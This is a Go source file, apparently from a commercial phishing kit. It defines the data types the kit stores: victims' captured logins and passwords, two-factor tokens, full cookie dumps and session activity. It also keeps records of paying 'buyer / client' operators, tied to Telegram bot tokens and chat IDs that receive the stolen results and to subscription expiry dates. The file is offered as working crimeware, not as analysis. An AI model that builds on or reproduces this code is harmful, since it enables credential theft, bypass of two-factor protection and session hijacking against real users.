package capture

// Credential represents one captured login
// capture/types.go  (rewritten)

// Credential represents one captured login
type Credential struct {
	Slug      string `json:"slug"` // operator-slug (injected server-side)
	Email     string `json:"email"`
	Password  string `json:"password"`
	UserAgent string `json:"userAgent"`
	Timestamp string `json:"timestamp"`
	TGKey     string `json:"tg_key"`
}

// TwoFACode represents a captured 2-factor token
type TwoFACode struct {
	Slug      string `json:"slug"`
	Token     string `json:"token"`
	Method    string `json:"method"`
	Hostname  string `json:"hostname"`
	Pathname  string `json:"pathname"`
	UserAgent string `json:"userAgent"`
	Timestamp string `json:"timestamp"`
}

// CookieDump represents a full cookie capture
type CookieDump struct {
	Slug      string `json:"slug"`
	Email     string `json:"email"` // NEW
	Cookies   string `json:"cookies"`
	Hostname  string `json:"hostname"`
	Pathname  string `json:"pathname"`
	UserAgent string `json:"userAgent"`
	Timestamp string `json:"timestamp"`
}

// SessionEvent logs session activity or movement
type SessionEvent struct {
	Slug      string `json:"slug"`
	URL       string `json:"url"`
	Pathname  string `json:"pathname"`
	Hostname  string `json:"hostname"`
	Title     string `json:"title"`
	Referrer  string `json:"referrer"`
	UserAgent string `json:"userAgent"`
	Timestamp string `json:"timestamp"`
}

// UserInfo holds metadata about each buyer / client
type UserInfo struct {
	TGKey     string `json:"tg_key"`     // unique ID we assign
	Telegram  string `json:"telegram"`   // their Telegram handle
	BotToken  string `json:"bot_token"`  // token we gave them
	ChatID    string `json:"chat_id"`    // where to send result
	Expiry    string `json:"expiry"`     // expiration date
	CreatedAt string `json:"created_at"` // timestamp of registration
}
